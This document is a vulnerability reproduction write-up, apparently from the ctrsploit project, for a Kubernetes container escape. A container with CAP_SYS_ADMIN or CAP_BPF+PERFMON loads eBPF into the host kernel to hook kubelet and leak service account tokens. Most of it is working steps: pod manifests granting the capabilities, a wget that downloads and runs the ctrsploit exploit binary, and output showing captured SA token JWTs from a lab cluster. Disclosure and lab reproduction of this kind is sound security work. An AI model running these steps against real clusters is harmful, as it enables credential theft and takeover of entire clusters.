# ebpf escape by leaking k8s sa token via kubelet

## 1. Vulnerability Introduction

This vulnerability describes a container escape method that leverages eBPF.

When a container is granted excessive privileges (such as CAP_SYS_ADMIN or CAP_BPF), an attacker can load a malicious eBPF program into the host's kernel from within the container.

This eBPF program can leak k8s service account token via hooking kubelet. Once a high-privilege SA token is obtained, the attacker can elevate their privileges from a restricted container to gaining control over the entire Kubernetes cluster, posing a severe security risk.

## 2. Exploit Scenario

Insecure configuration

## 3. Prerequisites

vulnerability exists:
* CAP_BND: CAP_SYS_ADMIN / CAP_BPF

vulnerability exploitable:
* CAP_EFF: CAP_SYS_ADMIN / CAP_BPF+CAP_PERFMON

## 4. Vulnerability Existence Check

`ctrsploit checksec ebpf`

## 5. Reproduce

![video.svg](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive
$ cd docker_archive/kubernetes/v1.33.1-calico
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
$ until kubectl --kubeconfig=kubeconfig wait --for=condition=Ready pod --all -A --timeout=30s; do sleep 10; done
$ kubectl --kubeconfig=kubeconfig get pods -A
NAMESPACE          NAME                                        READY   STATUS    RESTARTS        AGE
calico-apiserver   calico-apiserver-789bcb55b-cckpl            1/1     Running   1 (2m29s ago)   14m
calico-apiserver   calico-apiserver-789bcb55b-w4zqk            1/1     Running   1 (2m29s ago)   14m
calico-system      calico-kube-controllers-945bcc5f8-p8czx     1/1     Running   1 (2m29s ago)   14m
calico-system      calico-node-zf9qf                           1/1     Running   1 (2m29s ago)   14m
calico-system      calico-typha-7dccd7876b-4596t               1/1     Running   1 (2m29s ago)   14m
calico-system      csi-node-driver-vj6n9                       2/2     Running   2 (2m29s ago)   14m
calico-system      goldmane-86cd9d999d-74dfv                   1/1     Running   1 (2m29s ago)   14m
calico-system      whisker-699cdc85cb-gwsjm                    2/2     Running   2 (2m29s ago)   11m
kube-system        coredns-674b8bbfcf-bz69g                    1/1     Running   1 (2m29s ago)   3h36m
kube-system        coredns-674b8bbfcf-f2k2f                    1/1     Running   1 (2m29s ago)   3h36m
kube-system        etcd-kubernetes-1-33-1                      1/1     Running   2 (2m29s ago)   3h36m
kube-system        kube-apiserver-kubernetes-1-33-1            1/1     Running   3 (2m29s ago)   3h36m
kube-system        kube-controller-manager-kubernetes-1-33-1   1/1     Running   2 (2m29s ago)   3h36m
kube-system        kube-proxy-s4qzw                            1/1     Running   2 (2m29s ago)   3h36m
kube-system        kube-scheduler-kubernetes-1-33-1            1/1     Running   2 (2m29s ago)   3h36m
tigera-operator    tigera-operator-68f7c7984d-vknxx            1/1     Running   1 (2m29s ago)   14m
```


```shell
$ ./ssh
root@kubernetes-1-33-1:~# helm version
version.BuildInfo{Version:"v3.18.3", GitCommit:"6838ebcf265a3842d1433956e8a622e3290cf324", GitTreeState:"clean", GoVersion:"go1.24.4"}
root@kubernetes-1-33-1:~# kubectl version
Client Version: v1.33.1
Kustomize Version: v5.6.0
Server Version: v1.33.1
root@kubernetes-1-33-1:~# containerd --version
containerd github.com/containerd/containerd/v2 v2.1.0 061792f0ecf3684fb30a3a0eb006799b8c6638a7
root@kubernetes-1-33-1:~# runc --version
runc version 1.3.0
commit: v1.3.0-0-g4ca628d1
spec: 1.2.1
go: go1.23.8
libseccomp: 2.5.6
root@kubernetes-1-33-1:~# uname -a
Linux kubernetes-1-33-1 6.8.0-63-generic #66-Ubuntu SMP PREEMPT_DYNAMIC Fri Jun 13 20:25:30 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
root@kubernetes-1-33-1:~# cat /etc/os-release
PRETTY_NAME="Ubuntu 24.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04.2 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=noble
LOGO=ubuntu-logo
```

</details>

### 5.2 Reproduce Steps

#### 5.2.1 CAP_SYS_ADMIN

```shell
$ cat <<EOF | kubectl --kubeconfig kubeconfig apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  restartPolicy: Never
  containers:
    - name: test-container
      image: busybox:latest
      tty: true
      command: ["sleep", "inf"]
      securityContext:
        capabilities:
          add:
            - "SYS_ADMIN"
EOF
$ kubectl --kubeconfig=kubeconfig wait --for=condition=ready pod/test-pod --timeout=120s
$ kubectl --kubeconfig=kubeconfig exec -ti test-pod -- ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
Connecting to github.com (20.205.243.166:443)
wget: note: TLS certificate validation not implemented
Connecting to github.com (20.205.243.166:443)
Connecting to release-assets.githubusercontent.com (185.199.111.133:443)
saving to '/usr/bin/ctrsploit'
ctrsploit            100% |**********************************************************************************************************************************************************************************************| 17.1M  0:00:00 ETA
'/usr/bin/ctrsploit' saved
/ # chmod +x /usr/bin/ctrsploit 
/ # ctrsploit vul caps sys_admin x ebpf kubelet
INFO[0000] Waiting for events..                         
INFO[0000] pid: 439, fd=25, pathname: /var/lib/kubelet/pods/d6406cbb-5476-45a6-a906-a09fb94b702e/volumes/kubernetes.io~projected/kube-api-access-td5cf/..2025_10_09_13_29_37.260125830/token
token: eyJhbGciOiJSUzI1NiIsImtpZCI6InR1dGsyVGxpOFoyQm1nSV9TaFRkaTFTbTZ3UlRkd2hLaDVzamsyTGphU28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzkxNTUyNTc3LCJpYXQiOjE3NjAwMTY1NzcsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiYzJlYWI4NGQtNGE5My00ZTFmLTgwODMtNzc3ZmI3ZWJiNTAwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsIm5vZGUiOnsibmFtZSI6Imt1YmVybmV0ZXMtMS0zMy0xIiwidWlkIjoiOGJhNzhhZjAtMTU3Ni00OTc4LTkyNDEtZGY1MDhkZTFmNjQ1In0sInBvZCI6eyJuYW1lIjoiY29yZWRucy02NzRiOGJiZmNmLWYyazJmIiwidWlkIjoiZDY0MDZjYmItNTQ3Ni00NWE2LWE5MDYtYTA5ZmI5NGI3MDJlIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJjb3JlZG5zIiwidWlkIjoiMWYxZmQ2Y2QtYWU2YS00MjNkLWI3ODMtZjVkZDc1YTMxYThkIn0sIndhcm5hZnRlciI6MTc2MDAyMDE4NH0sIm5iZiI6MTc2MDAxNjU3Nywic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50Omt1YmUtc3lzdGVtOmNvcmVkbnMifQ.VL6A_7OeuZY53OyVRTxIgsI80d5XHW1yBtlf3OCK_aWu6Ks5mdnL04iRephIfC9Oe1Ib5d7vNSpSdZeLCebil-8eH7Wgv4cCqf7agWkM1izd1alEmKctUzsA_xr8mGxhYYYIErFm8G_qplg-owkUgoWcqG_gfWv_Kcfx_CnYo
```

#### 5.2.1 CAP_BPF+CAP_PERFMON

```shell
$ cat <<EOF | kubectl --kubeconfig kubeconfig apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: test-pod
spec:
  restartPolicy: Never
  containers:
    - name: test-container
      image: busybox:latest
      tty: true
      command: ["sleep", "inf"]
      securityContext:
        capabilities:
          add:
            - "BPF"
            - "PERFMON"
EOF
$ kubectl --kubeconfig=kubeconfig wait --for=condition=ready pod/test-pod --timeout=120s
$ kubectl --kubeconfig=kubeconfig exec -ti test-pod -- ash
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
Connecting to github.com (20.205.243.166:443)
wget: note: TLS certificate validation not implemented
Connecting to github.com (20.205.243.166:443)
Connecting to release-assets.githubusercontent.com (185.199.109.133:443)
saving to '/usr/bin/ctrsploit'
ctrsploit            100% |*********************************************************************************************************************************************************************| 17.9M  0:00:00 ETA
'/usr/bin/ctrsploit' saved
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul caps sys_admin x ebpf kubelet
INFO[0000] Waiting for events..                         
INFO[0007] pid: 466, fd=25, pathname: /var/lib/kubelet/pods/17496751-310a-4ed9-946c-720119f7e168/volumes/kubernetes.io~projected/kube-api-access-9b7kf/..2025_11_05_14_05_28.3705845087/token
token: eyJhbGciOiJSUzI1NiIsImtpZCI6InR1dGsyVGxpOFoyQm1nSV9TaFRkaTFTbTZ3UlRkd2hLaDVzamsyTGphU28ifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzkzODg3NTI4LCJpYXQiOjE3NjIzNTE1MjgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwianRpIjoiNWE3NTYzNDUtODBlZS00NDMwLWE1YTItNmMxM2FlYzE3Y2EwIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJjYWxpY28tc3lzdGVtIiwibm9kZSI6eyJuYW1lIjoia3ViZXJuZXRlcy0xLTMzLTEiLCJ1aWQiOiI4YmE3OGFmMC0xNTc2LTQ5NzgtOTI0MS1kZjUwOGRlMWY2NDUifSwicG9kIjp7Im5hbWUiOiJjc2ktbm9kZS1kcml2ZXItdmo2bjkiLCJ1aWQiOiIxNzQ5Njc1MS0zMTBhLTRlZDktOTQ2Yy03MjAxMTlmN2UxNjgifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImNzaS1ub2RlLWRyaXZlciIsInVpZCI6IjliMDQ2M2MzLWJkZmMtNGZkMC1iYzQzLTdiMTg5NWVkMWUwZCJ9LCJ3YXJuYWZ0ZXIiOjE3NjIzNTUxMzV9LCJuYmYiOjE3NjIzNTE1MjgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpjYWxpY28tc3lzdGVtOmNzaS1ub2RlLWRyaXZlciJ9.PFDRXca7c5uH_IICyWuqvvjXTaFqySG4mhFjv0AkntXsiscrEJuO40eI-jpLpGPT-BxRQErF9B5N0y4t7jyCkcmH6IhUFlfESDLt6Xr2itxcqDEgPC_yPqw9osmnSe6x7OP9Ii9y1a9ex2jKuuP
```